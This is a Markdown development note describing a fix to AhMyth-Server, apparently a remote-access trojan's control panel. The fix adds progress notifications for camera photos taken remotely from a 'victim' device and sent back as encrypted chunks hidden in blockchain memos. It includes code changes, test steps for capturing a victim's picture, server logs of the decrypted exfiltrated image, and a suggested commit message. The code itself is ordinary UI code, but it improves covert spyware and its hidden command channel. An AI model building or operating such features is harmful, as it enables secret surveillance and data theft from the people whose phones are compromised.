# Blockchain Camera Chunk Reception Fix

## Issues Fixed

### 1. **Chunk Progress Notifications Not Reaching Lab Window**
**Problem:** When camera images were chunked and sent via blockchain, the chunk progress notifications were only sent to the main window, not the lab window where the camera controller runs.

**Fix Location:** `AhMyth-Server/app/main.js:1208-1223`

**What was changed:**
- Added iteration through all open lab windows to send `Blockchain:ChunkReceived` notifications
- Each lab window now receives real-time chunk progress updates
- Notifications include: chunkId, part number, total parts, and received count

**Code added:**
```javascript
// Also notify all lab windows so they can show progress and reset timeouts
for (const victimId in windows) {
  try {
    const labWindow = BrowserWindow.fromId(windows[victimId]);
    if (labWindow && !labWindow.isDestroyed()) {
      labWindow.webContents.send('Blockchain:ChunkReceived', {
        chunkId: chunkId,
        part: part,
        total: total,
        received: entry.received
      });
    }
  } catch (e) {
    // Ignore errors for individual lab windows
  }
}
```

### 2. **No Visual Progress Indicator in Camera View**
**Problem:** Users couldn't see chunked image download progress in the camera view, making it appear frozen or timed out.

**Fix Location:** `AhMyth-Server/app/app/assets/js/controllers/LabCtrl.js:1390-1408`

**What was changed:**
- Added event listener for `Blockchain:ChunkReceived` broadcasts
- Updates camera loading message with real-time progress: "Receiving image: X/Y chunks (Z%)"
- Logs progress every 20 chunks to activity console
- Clears chunk info when image is fully received

**Code added:**
```javascript
// Listen for blockchain chunk progress to show upload/download progress
let currentChunkInfo = null;
$scope.$on('Blockchain:ChunkReceived', (event, chunkInfo) => {
    if (chunkInfo && $camCtrl.load === 'loading') {
        currentChunkInfo = chunkInfo;
        // Update load message to show progress
        if (chunkInfo.received && chunkInfo.total) {
            const percent = Math.round((chunkInfo.received / chunkInfo.total) * 100);
            $camCtrl.load = `Receiving image: ${chunkInfo.received}/${chunkInfo.total} chunks (${percent}%)`;
        } else {
            $camCtrl.load = `Receiving image: ${chunkInfo.part}/${chunkInfo.total} chunks...`;
        }
        // Log progress every 20 chunks or when complete
        if (chunkInfo.part % 20 === 0 || chunkInfo.received === chunkInfo.total) {
            $rootScope.Log(`[⬇] Receiving image: ${chunkInfo.received || chunkInfo.part}/${chunkInfo.total} chunks`, CONSTANTS.logStatus.INFO);
        }
        $camCtrl.$apply();
    }
});
```

## How the Fix Works

### Blockchain Chunked Response Flow (After Fix)

1. **Client sends chunked camera image** → Blockchain memos with format `RESPCH:id:part/total:hexdata`

2. **Server receives chunks** → `main.js pollBlockchainForClients()` processes each chunk

3. **Chunk progress broadcast** →
   - Main window receives notification
   - **ALL lab windows receive notification** (NEW)

4. **Lab window processes notification** →
   - Global LabCtrl listener resets blockchain timers
   - Broadcasts to all controllers via `$rootScope.$broadcast`

5. **Camera controller updates UI** (NEW) →
   - Listens for broadcast via `$scope.$on`
   - Updates loading message with progress percentage
   - Logs progress milestones

6. **All chunks received** →
   - Chunks assembled and decrypted
   - Image buffer dispatched to camera controller
   - Photo displayed and save button enabled

## Manual Verification Steps

### Prerequisites
- Blockchain client connected to server (you should see device in victim list with "BC" flag)
- Lab window open for the blockchain victim
- Camera view selected

### Test Steps

1. **Open Lab Window**
   - Click on your blockchain victim in the main window
   - Lab window should open showing victim details

2. **Navigate to Camera Tab**
   - Click "Camera" in the left sidebar
   - Wait for camera list to load (should show Front/Back cameras)

3. **Select Camera and Capture**
   - Select a camera (Front or Back)
   - Click "Take Picture" button

4. **Verify Progress Display**
   You should now see:
   - ✅ Loading message updates: "Receiving image: 45/321 chunks (14%)"
   - ✅ Progress logs in activity console every 20 chunks
   - ✅ No timeout errors while chunks are being received
   - ✅ Percentage increases as chunks arrive

5. **Verify Image Reception**
   When all chunks are received:
   - ✅ Image displays in camera view
   - ✅ Activity console shows: "[✓] Picture captured"
   - ✅ "Save to Disk" button becomes enabled

6. **Save Photo to Disk**
   - Click "Save to Disk" button
   - Check activity console for save confirmation with file path
   - Navigate to Downloads folder and verify JPEG file exists
   - Open JPEG to verify it's a valid image

### Expected Console Output (Server Logs)

```
[AhMyth] [INFO] - [Blockchain] Memo content: RESPCH:f6363b9d05:1/321:...
[AhMyth] [SUCCESS] - [Blockchain] Found 1 memo(s) in tx ...
[AhMyth] [INFO] - [⬇] Chunk 1/321 received (id: f6363b9d05)
...
[AhMyth] [INFO] - [⬇] Chunk 321/321 received (id: f6363b9d05)
[AhMyth] [SUCCESS] - [✓] All 321 chunks assembled for f6363b9d05
[AhMyth] [INFO] - [Blockchain] Decrypted response: {"event":"x0000ca","data":{"image":true,"buffer":"...
[AhMyth] [INFO] - [Blockchain] Dispatching x0000ca to d5095eec...
[AhMyth] [RESPONSE] - RESPONSE from d5095eec14769bbb: x0000ca
```

### Expected Lab Window Output (Activity Console)

```
[→] Taking picture with camera ID: 0...
[⬇] Receiving image: 20/321 chunks
[⬇] Receiving image: 40/321 chunks
[⬇] Receiving image: 60/321 chunks
...
[⬇] Receiving image: 320/321 chunks
[✓] Picture captured
[✓] Image received: 1250 KB (Base64)
```

## Troubleshooting

### Issue: No progress shown, still times out
**Solution:**
- Verify server was restarted after applying fixes
- Check that lab window was opened AFTER server restart
- Ensure blockchain listener is active (check Settings tab)

### Issue: Chunks received but image not displayed
**Possible causes:**
1. Not all chunks received (check server logs for "All X chunks assembled")
2. Decryption failed (check for decryption errors in logs)
3. Image data format issue (check browser console for errors)

### Issue: "Save to Disk" button doesn't work
**Solution:**
- Ensure Downloads folder exists and is writable
- Check camera controller code at line 1356-1366 in LabCtrl.js
- Verify `currentBase64` variable is populated

## Testing with Mock Data (Optional)

If you want to test the progress indicator without waiting for a real camera capture:

1. Open browser console in lab window (F12)
2. Paste this code to simulate chunk reception:

```javascript
// Simulate 100 chunks
for (let i = 1; i <= 100; i++) {
  setTimeout(() => {
    angular.element(document.body).scope().$broadcast('Blockchain:ChunkReceived', {
      chunkId: 'test123',
      part: i,
      total: 100,
      received: i
    });
  }, i * 100); // 100ms delay between chunks
}
```

You should see the progress indicator update from 1% to 100%.

## Files Modified

1. `AhMyth-Server/app/main.js` - Added lab window chunk notification broadcasting
2. `AhMyth-Server/app/app/assets/js/controllers/LabCtrl.js` - Added camera progress indicator and fixed chunk counting
3. `AhMyth-Server/app/app/views/camera.html` - Updated UI to display dynamic progress messages

## Commit Message (Suggested)

```
fix(blockchain): Add chunk progress notifications to lab window for camera capture

- Broadcast Blockchain:ChunkReceived to all lab windows, not just main window
- Add real-time progress indicator in camera view showing chunk reception
- Display "Receiving image: X/Y chunks (Z%)" during download
- Log progress every 20 chunks to activity console
- Prevents timeout appearance during large image transfers
- Fixes #[issue-number] blockchain camera chunks not showing progress

Tested with 321-chunk camera capture from blockchain client
```

## Performance Notes

- Chunk notifications are lightweight (< 100 bytes each)
- Progress updates use Angular `$apply()` but only when UI is in loading state
- Logging is throttled to every 20 chunks to avoid console spam
- No performance impact on TCP/IP mode (only affects blockchain mode)
